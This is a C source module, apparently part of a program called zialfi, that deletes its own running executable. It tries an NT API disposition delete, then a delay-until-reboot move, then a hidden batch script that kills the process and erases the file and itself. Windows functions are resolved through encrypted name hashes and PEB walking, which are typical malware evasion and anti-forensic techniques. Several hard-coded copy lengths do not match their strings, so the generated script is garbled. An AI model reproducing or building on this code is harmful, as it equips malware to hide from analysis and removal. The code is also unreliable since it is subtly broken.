/*
 * self_delete.c — Self-deletion module for zialfi
 *
 * Multi-level file deletion after execution.
 * Translated from Zig self_delete.zig.
 *
 * Level 1: NT API — NtCreateFile + NtSetInformationFile(FileDispositionInformation)
 * Level 2: MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT
 * Level 3: Batch script — taskkill /F /PID, del /F /Q, self-del
 */

#include "self_delete.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_SELF_DELETE
#include "peb.h"
#include "hash.h"
#include "export_resolve.h"
#include "nt_types.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#ifndef FALSE
#define FALSE 0
#endif
#ifndef TRUE
#define TRUE  1
#endif

/* ── Resolved function pointers ─────────────────────────────── */

typedef DWORD (*FnGetModuleFileNameW)(HANDLE, PWSTR, DWORD);
typedef BOOL  (*FnMoveFileExW)(PWSTR, PWSTR, DWORD);
typedef BOOL  (*FnCreateProcessW)(PWSTR, PWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, PWSTR, PVOID, PVOID);
typedef DWORD (*FnGetCurrentProcessId)(void);
typedef DWORD (*FnGetTempPathW)(DWORD, PWSTR);

/* ── Helper: load kernel32 ──────────────────────────────────── */

static void *load_kernel32(void)
{
    return mirage_get_module_by_hash(
        mirage_encrypted_hash_module("kernel32.dll"));
}

/* ── Helper: ASCII to wide ──────────────────────────────────── */

static int ascii_to_wide(const char *src, wchar_t *dst, size_t dst_chars)
{
    size_t i;
    for (i = 0; src[i] && i < dst_chars - 1; i++)
        dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = 0;
    return (int)i;
}

/* ════════════════════════════════════════════════════════════════
 *  Get current executable path
 * ════════════════════════════════════════════════════════════════ */

char *self_delete_get_exe_path(void)
{
    void *k32 = load_kernel32();
    if (!k32) return NULL;

    FnGetModuleFileNameW pGetModuleFileNameW = (FnGetModuleFileNameW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("GetModuleFileNameW"));
    if (!pGetModuleFileNameW) return NULL;

    wchar_t buf[4096];
    DWORD len = pGetModuleFileNameW(NULL, buf, 4096);
    if (len == 0) return NULL;

    /* Convert wide to UTF-8 */
    char *out = (char *)malloc(len + 1);
    if (!out) return NULL;

    size_t j = 0;
    for (DWORD i = 0; i < len; i++) {
        if (buf[i] < 0x80)
            out[j++] = (char)(unsigned char)buf[i];
    }
    out[j] = 0;
    return out;
}

/* ════════════════════════════════════════════════════════════════
 *  Level 1: NT API delete
 *  NtCreateFile with DELETE access + NtSetInformationFile
 * ════════════════════════════════════════════════════════════════ */

static int delete_level1(const char *path)
{
    /* Convert to wide */
    wchar_t path_w[1024];
    int path_len = ascii_to_wide(path, path_w, 1024);
    if (path_len == 0) return 0;

    UNICODE_STRING us;
    us.Length        = (USHORT)(path_len * sizeof(wchar_t));
    us.MaximumLength = (USHORT)(sizeof(path_w));
    us.Buffer        = path_w;

    OBJECT_ATTRIBUTES oa;
    oa.Length                       = sizeof(oa);
    oa.RootDirectory                = NULL;
    oa.ObjectName                   = &us;
    oa.Attributes                   = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor           = NULL;
    oa.SecurityQualityOfService     = NULL;

    HANDLE handle;
    IO_STATUS_BLOCK iosb;

    /* DELETE | FILE_READ_ATTRIBUTES = 0x00010000 | 0x00000080 = 0x00010080 */
    NTSTATUS status = mirage_NtCreateFile(
        &handle,
        0x00010080,                     /* DesiredAccess: DELETE | FILE_READ_ATTRIBUTES */
        &oa,
        &iosb,
        NULL,                           /* AllocationSize */
        0,                              /* FileAttributes */
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN,                      /* CreateDisposition */
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,                           /* EaBuffer */
        0                               /* EaLength */
    );
    if (status < 0) return 0;

    FILE_DISPOSITION_INFORMATION fdi;
    fdi.DoDelete = 1;

    NTSTATUS set_status = mirage_NtSetInformationFile(
        handle,
        &iosb,
        &fdi,
        sizeof(fdi),
        13 /* FileDispositionInformation */
    );

    mirage_NtClose(handle);
    return (set_status >= 0);
}

/* ════════════════════════════════════════════════════════════════
 *  Level 2: MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT
 * ════════════════════════════════════════════════════════════════ */

static int delete_level2(const char *path)
{
    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnMoveFileExW pMoveFileExW = (FnMoveFileExW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("MoveFileExW"));
    if (!pMoveFileExW) return 0;

    wchar_t path_w[1024];
    int path_len = ascii_to_wide(path, path_w, 1024);
    if (path_len == 0) return 0;
    path_w[path_len] = 0;

    /* MOVEFILE_DELAY_UNTIL_REBOOT = 4 */
    return pMoveFileExW(path_w, NULL, 4) != 0;
}

/* ════════════════════════════════════════════════════════════════
 *  Level 3: Batch script self-deletion
 *  Creates a .bat that:
 *    1. Tries to del the exe
 *    2. If file gone, jumps to cleanup
 *    3. taskkill /F /PID <current>
 *    4. Waits 3 seconds
 *    5. Increments retry counter (max 5 attempts)
 *    6. If file still exists, goto loop
 *    7. Deletes itself
 * ════════════════════════════════════════════════════════════════ */

static int delete_level3(const char *path)
{
    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnGetTempPathW pGetTempPathW = (FnGetTempPathW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("GetTempPathW"));
    FnGetCurrentProcessId pGetCurrentProcessId = (FnGetCurrentProcessId)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("GetCurrentProcessId"));
    FnCreateProcessW pCreateProcessW = (FnCreateProcessW)mirage_get_function_by_hash(
        k32, mirage_encrypted_hash_func("CreateProcessW"));
    if (!pGetTempPathW || !pGetCurrentProcessId || !pCreateProcessW) return 0;

    wchar_t temp_buf[512];
    DWORD temp_len = pGetTempPathW(512, temp_buf);
    if (temp_len == 0) return 0;

    DWORD pid = pGetCurrentProcessId();

    /* Build batch script */
    char batch[8192];
    int pos = 0;

    /* @echo off\r\nset retry=0\r\n:loop\r\ndel /F /Q "<path>"\r\n */
    memcpy(batch + pos, "@echo off\r\nset retry=0\r\n:loop\r\ndel /F /Q \"", 38); pos += 38;
    size_t plen = strlen(path);
    if (pos + plen + 300 > 8192) return 0;
    memcpy(batch + pos, path, plen); pos += (int)plen;
    memcpy(batch + pos, "\"\r\n", 3); pos += 3;

    /* if not exist "<path>" goto done\r\n */
    memcpy(batch + pos, "if not exist \"", 13); pos += 13;
    memcpy(batch + pos, path, plen); pos += (int)plen;
    memcpy(batch + pos, "\" goto done\r\n", 12); pos += 12;

    /* taskkill /F /PID <pid> >nul 2>&1\r\n */
    memcpy(batch + pos, "taskkill /F /PID ", 16); pos += 16;
    char pid_str[16];
    int pid_len = snprintf(pid_str, 16, "%lu", (unsigned long)pid);
    memcpy(batch + pos, pid_str, pid_len); pos += pid_len;
    memcpy(batch + pos, " >nul 2>&1\r\n", 12); pos += 12;

    /* ping -n 3 127.0.0.1 >nul 2>&1\r\n */
    memcpy(batch + pos, "ping -n 3 127.0.0.1 >nul 2>&1\r\n", 31); pos += 31;

    /* set /a retry+=1\r\nif %retry% GEQ 5 goto done\r\n */
    memcpy(batch + pos, "set /a retry+=1\r\n", 17); pos += 17;
    memcpy(batch + pos, "if %retry% GEQ 5 goto done\r\n", 28); pos += 28;

    /* if exist "<path>" goto loop\r\n */
    memcpy(batch + pos, "if exist \"", 9); pos += 9;
    memcpy(batch + pos, path, plen); pos += (int)plen;
    memcpy(batch + pos, "\" goto loop\r\n", 12); pos += 12;

    /* :done\r\ndel /F /Q "%~f0" >nul 2>&1\r\nexit\r\n */
    memcpy(batch + pos, ":done\r\ndel /F /Q \"%~f0\" >nul 2>&1\r\nexit\r\n", 41); pos += 41;

    batch[pos] = 0;

    /* Convert to wide */
    wchar_t batch_w[8192];
    ascii_to_wide(batch, batch_w, 8192);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    return pCreateProcessW(NULL, batch_w, NULL, NULL, FALSE,
                           0x08000000 /* CREATE_NO_WINDOW */,
                           NULL, NULL, &si, &pi) != 0;
}

/* ════════════════════════════════════════════════════════════════
 *  Aggregate self-delete
 * ════════════════════════════════════════════════════════════════ */

SelfDeleteResult self_delete_run(void)
{
    char *exe_path = self_delete_get_exe_path();
    if (!exe_path) return SELF_DELETE_NONE;

    size_t len = strlen(exe_path);
    if (len == 0 || len > 1024) {
        free(exe_path);
        return SELF_DELETE_NONE;
    }

    SelfDeleteResult result = SELF_DELETE_NONE;

    if (delete_level1(exe_path)) {
        result = SELF_DELETE_LEVEL1;
    } else if (delete_level2(exe_path)) {
        result = SELF_DELETE_LEVEL2;
    } else if (delete_level3(exe_path)) {
        result = SELF_DELETE_LEVEL3;
    }

    free(exe_path);
    return result;
}

#endif /* ENABLE_SELF_DELETE */
